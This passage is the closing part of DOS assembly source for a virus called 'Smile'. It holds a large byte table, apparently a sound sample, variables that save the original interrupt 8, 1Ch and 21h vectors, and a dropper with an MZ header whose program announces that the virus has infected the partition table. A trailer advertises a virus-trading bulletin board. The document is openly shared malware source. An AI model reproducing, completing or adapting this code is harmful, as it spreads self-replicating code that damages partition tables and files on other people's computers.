		db	  7,  2, 57,207, 12,113,198, 56,249,193,220,115,  7,  3,225,240
		db	 30,208,226, 28, 97,192, 56,193, 67, 51, 49,142,207,140,240,142
		db	 49,227,156,103,131, 57,142, 99,226, 60, 15,128,240, 30,  7,145
		db	249, 14,  1,224, 61,131,240,115, 14, 65,248,121,  7,160,230, 63
		db	195,220, 63,135,240,158, 25,195, 24,231, 24, 99,156, 49,206,115
		db	135, 57,200,156,103, 48,113,142,112,198, 59,195, 24,231, 14,113
		db	156, 27,196,112,231, 61,241,220,127,134,113,220, 29,199, 55,127
		db	 15,225,252, 31,135,248, 31, 15,231,156,103, 14,227,252, 51,152
		db	 61,  6,120,207,  3,248,158,  7,240, 62, 67,224,124, 15,224,252
		db	143,192,241, 31,129,226, 62,  7,192,252, 31,129,248, 63,  7,240
		db	124, 15,193,248, 63,  7,224,254, 31,193,248, 63,  7,240,254, 15
		db	193,252, 63,131,240, 63,  7,224,126, 31,193,252, 63,131,248,190
		db	  7,241,124, 31,227,252, 63,195,248, 63,199,240,125,199,216,120
		db	227, 14, 48,248, 15,128,252, 31,195,248,103,  3,241,220,  7,195
		db	248,127,135,240,126, 15,224,252, 31,129,248, 63,  7,240,120, 15
		db	128,240, 63, 15,224,254, 31,193,248, 31,  3,225,246, 31,195,220
		db	 63,131,240, 63,131,224,126,  7,224,252, 31,195,252, 62,  7,248
		db	124, 15,177,248, 15,  3,240,254,  7,128,248, 15,  1,248, 30,  7
		db	192,124, 15,129,242, 59,131,192,116, 30,  3,232,126,  7,224,254
		db	  7,192,252,103,  3,152,244, 23,  3,224, 60,  7,194,188,  7,129
		db	252, 47,  7,176,126, 15,224,252, 25,194,241, 57,199,112,112, 15
		db	  1,248, 31,135,240,255, 15,225,248, 31,131,248,124,  3,240,124
		db	 15,129,240, 31,  3,224,125,  7,160,126, 15,192,230, 28,227,136
		db	120,  7,176,244, 30,193,240, 61,  7,176,246, 14,  1,200, 28,  3
		db	128, 60,  7,134,120, 79,129,248,127,  7,230,120,199,152,225, 14
		db	115,192, 57,199, 28,115,  7, 25,254, 78,231, 59,221,200, 15,204
		db	156,152, 14,236,252,136,142,236,204,136, 76,204,249,144, 25,147
		db	114,100,118,111,145, 39,191,249, 19,247, 36,127,152, 19,254,136
		db	159,176,  7,254,  1,127,192, 31,252,  1,255,128, 31,230, 65,254
		db	  0,127,216, 19,254,  1,127, 32, 15,248,  1,255,192, 31,248,  3
		db	254,  0,255,192, 31,248,  1,255,128, 31,224,  7,252,  9,190, 96
		db	 15,236,  9,255,  0,159,176,  7,251,  2,127,128, 31,216, 11,252
		db	129,191,144, 15,252,  3,255,128, 63,228, 13,254,  0,255,240,  7
		db	254,  1,191,192, 31,252,  1,255,  0,127,248, 19,127,129, 63,228
		db	 15,254,  0, 63,224, 13,254, 34, 55,228, 73,254,100,223,124,201
		db	191,224, 25,179, 32, 79,236,137,255,192, 79,254,  0,255,200, 23
		db	249, 32,155,108,130,102, 76,200,204,222,  4,166,251, 19, 32, 31
		db	236,140,236,204,108,204,153, 20,217,153, 25,179, 32,118,249,166
		db	219, 32, 23,108,146,108,200,111,230, 70,236,195, 63, 36, 71,201
		db	153, 59, 36,219,178,110,236,130, 93,194,102,249, 32,207,228, 66
		db	123,146, 59, 51, 38,153, 50,219,100,251,153,157,154,100, 99, 54
		db	108,195, 50,121,182,217,166,125, 50, 79, 54, 73,178,204,214,108
		db	147, 51, 33,147,108,200,155,177, 37,179,102,  3,237,140,154,136
		db	155,246, 68,255,236,137, 19, 63,204,153,191,144, 19,254, 64, 79
		db	252,  4,255,128, 63,240,  7,255, 19,119,233, 19, 51, 34, 55,120
		db	  2,110,201, 63,220,139,230, 98,127,140,102,243,201,155,216,  7
		db	243, 19,124,204,137,190,  3,246,115, 51, 38,100,219, 96, 59, 62
		db	 68,155,200,159,236,201,178,100, 73, 51, 19,153,140,155, 49, 19
		db	236,131,127,241,  3,252,205,222, 25,153,255,145, 62,  3,102, 76
		db	217, 31,204, 31,153,191,112, 63,177,187,204, 76,119,112, 29,196
		db	 27,243, 38,204,199, 51, 54, 76,157,230, 77,217,144, 63,228, 79
		db	100,178,100,205,143,236, 25,147,120,129,248,  3,252,146,220,132
		db	216,157,217,183, 51, 35,147,205, 36,216, 25,155, 50,101,147,147
		db	 38,196,105, 50, 71,199, 28,216,115, 48,205,179, 38,216, 60,179
		db	 97,230,109,147,110, 38,121, 48,227, 64,204,198,  7, 14,108, 76
		db	184,240,195,239,134,115, 55,137, 15,184, 38,108, 12, 25,204,104
		db	243, 97,147,199, 39,152, 54,125, 49,243,179,102,205,204,155, 54
		db	126, 89, 60,217,102,195, 39,131, 79,  7,156, 38,121, 48,112,217
		db	225,159,227, 19, 12,150, 67, 54, 77,188,153, 60,250,108,155,108
		db	 61,200,134, 79, 46,192,221,  3,255, 17,240,255,240, 62, 13,254
		db	 19,178,223,128,204, 39,209, 44,153,225,180, 29,225, 60, 63,194
		db	120, 63,  1,248,188, 15,113,116, 27,  7, 51,204,115, 30,230, 59
		db	133,241, 60,  7,145,236,206,195,184,222,  3,137,242, 60,140, 99
		db	228,241,159, 23, 68,216,249, 15, 17,134,199, 65,126, 63,  7,216
		db	254, 31,227,232, 59,143,226,254, 55,135,241,188,101,199, 57,135
		db	198,112,159, 31,195,248,158, 71,249,199,145,240,248, 15,103,204
		db	 19,141,195, 56,143,129,252,  7,167,241, 61,140,225,156,  3,136
		db	114, 30, 49,204,240,118, 48,195, 30, 71,192,121, 23,  1,248,198
		db	 48,236, 49,156,241, 12,143,130,120,254, 15,226,184,251, 19,217
		db	253, 39,155, 98, 45,144,204, 55,155,113,159, 39, 97,242,187,  6
		db	244,195, 60,102,217,131, 38, 51,129,196,198, 12,224,198,125,100
		db	147,201, 53,159, 99, 60, 27, 97,188,142, 55,128,241,204,198,109
		db	130, 25,229,152,121,147, 49,140,153, 36,194,115, 24,198,121, 39
		db	152,243, 55, 19,198,126, 25,201,236,247, 25,196,120,141, 36,243
		db	 46, 49,152,242, 12,195,199, 61,143,136,217,142,103, 56,205,129
		db	144, 25,135,185,156, 63,152,202, 59,135, 55,137,230,122,108,220
		db	 61,184,206,102, 62,102, 31,142,153,231,211,206,225,231,151,105
		db	246,199,241,249,143,195,246,159,147,223,142,209,251,143,227,157
		db	159, 99,207, 25,199, 24,126,143,230,120,158,113,218, 63,199,240
		db	237,142,131,159, 57,230,120,238, 63,227,152,231,142,115, 30,115
		db	140,249,230,117,227,156,251,140,227,188,119,152,241, 26, 96,206
		db	 97,135, 61,199,159, 57,103,188,103, 24,241,248,115, 56,230,  6
		db	227,188,115,204,124, 31,141,193,214,115,198,119,135, 49,142, 60
		db	199, 48,115, 28,227,156,113,140,113,198, 24,198, 56,115, 26, 33
		db	205,204,131, 51, 31, 12,206, 60, 51,152, 49,206, 99,199, 51,140
		db	205,142, 60, 51,152,224,228,227,153, 49,198,198,227, 51,143, 14
		db	134, 54,118, 56,152,252, 99,227,185,207,143,198,103, 51,142,156
		db	159, 28,224,113,179,140,228,204, 39, 71,113,156,100,228,225,163
		db	137,204,158,103, 49,115, 12,193,204,199,139,204,204, 51,163, 26
		db	 56,204,225,198, 27,211,120,255, 46,225,239, 31,135, 92,111, 27
		db	147,156,114,229,147,142, 49,204,103,142, 57,156,152,236, 28,131
		db	179,113,198, 32,238, 53, 15, 29,241,120,247, 62, 53, 25,158, 48
		db	 11,153, 54, 15, 28,230, 28,241,220,241,206,225,175, 27,134,102
		db	103, 24,249,220,102,204,243, 51, 51,140,204,166, 51,103, 57,153
		db	147,103,104,206,121,204, 99,204,123, 60, 25, 38, 51, 98,218,123
		db	 22, 70, 28,219, 44,147, 76,192,227,200, 49,205,164,219,154,102
		db	 23, 54, 78, 60,218,100,216,210,100,241,228,231,201,167, 57,140
		db	 54, 15,206, 51, 47, 35,136,201,153, 35,140,115,134, 58,115,102
		db	120,236,204,153,163,120,198, 51,152, 54,204,225,147,101,201, 51
		db	 13,193,178, 62, 77,195, 52,207,202,204,120,193,142,108,209,227
		db	 28, 97,147, 19,152, 56,227,142, 92,240,199, 30, 48,241,207, 25
		db	108,157,109,199,155, 28, 97,155, 39, 28,241,205, 30, 24,226,199
		db	 28, 49,225,134, 56,229,154,108, 97,207, 62, 56,231, 14,124,200
		db	 54, 76,227,156, 56,227,143, 12,104,231, 28,179,103, 60,249,227
		db	135, 28,120,227,  6, 24,115,139, 56, 56,199,134, 56,115,199, 60
		db	153,204,222,108,241,195, 30, 60, 49,199,142, 24,112,227,134,115
		db	 51,155, 28,113,205,134,120,242, 99,143, 30,113,154, 44,249,231
		db	150,124,113,241,158, 25, 98,206, 92,179,231,143, 56,227,166, 12
		db	 32,199, 48,105,147, 25,156,108,204, 28, 51, 39,198,153,176,224
		db	252,216,103, 30, 71,205,131,  1,204,217,145,114, 60, 62,125, 60
		db	 31, 30, 76,158, 22,108,217, 25,176,204,158, 55,137,140,220,104
		db	226,204,105,241,204,201,227,204,201,227,140,203,195,156,207,199
		db	 28,199,195,140,199,195,156,199,231,140,199,195,156,207,206,121
		db	159, 38, 57,153,142,121,153,156,241,145,140,241,179,153,241,178
		db	204,209,131,153,227, 38,217,205,151, 28,198,103, 59, 25, 50, 77
		db	153, 46,121,140, 39, 49,140, 51, 50,102, 76,115,198, 12, 99,156
		db	 99,102,147,248,205,156,119,142,156,126, 76, 12,110, 77,152,236
		db	198, 56,102,102,120,220,243, 76,206,100,152,198, 49,153,152, 60
		db	223, 28,189, 55, 25,198, 15, 60,114, 14, 25, 51,207, 50,227, 19
		db	 36, 67,223,102,199, 92,102,131,  4,100,115,126,236,214, 48,108
		db	 77,191,204,  6,124,253,152, 32,255,136, 78,243,128,127,240, 59
		db	255,  0, 63,252, 15,251,192, 31,254,  3,255,192, 31,254,  3,255
		db	192, 63,252, 15,127,  0,127,240,  3, 16,  7,255,240, 32, 15,251

SampleEnd	equ	this byte

;------------------------------------------------------------------------------
;
; Variables
;
;------------------------------------------------------------------------------

Active		db	-1
ActiveYear	dw	-1
ActiveDate	dw	-1

OldInt8		equ	this dword		; orginal interrupt 8
OldInt8o	dw	-1
OldInt8s	dw	-1
OldInt1C	equ	this dword		; orginal interrupt 1ch
OldInt1Co	dw	-1
OldInt1Cs	dw	-1
OldInt21	equ	this dword		; orginal interrupt 21h
OldInt21o	dw	-1
OldInt21s	dw	-1

Count		dw	-1			; timer count
SampleOffset	dw	-1			; Used to make sound
SampleBit	db	-1
SampleFlag	db	-1
Handle		db	24 dup(-1)		; Filehandles

cseg ends

;------------------------------------------------------------------------------
;
; Orginal EXE-file
;
;------------------------------------------------------------------------------

mseg segment public 'code'
		assume	cs:mseg, ds:mseg, es:mseg


		db	'MZ'			; header
		dw	PrgSize			; PartPage
		dw	1			; PageCount
		dw	0			; relocation items = 0
		dw	0			; headersize = 0h
		dw	80h			; minimum memory
		dw	0ffffh			; maximum memory
		dw	(PrgSize+15)/10h	; ss
		dw	7feh			; sp
		dw	0			; chksum
		dw	offset Orginal		; ip
		dw	0			; cs
		dw	1ch			; offset relocation table
		dw	0			; overlay number

Orginal:	mov	ah,9			; display warning
		push	cs
		pop	ds
		mov	dx,offset Warning
		int	21h
		mov	ax,4c00h
		int	21h			; terminate

Warning		db	13,10
		db	'WARNING:',13,10
		db	13,10
		db	'Smile virus has now infected the partition table !!!!!',13,10
		db	13,10
		db	'$'

mseg ends

sseg segment stack 'stack'
		db	800h dup(?)
sseg ends

end Main

;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
;  컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
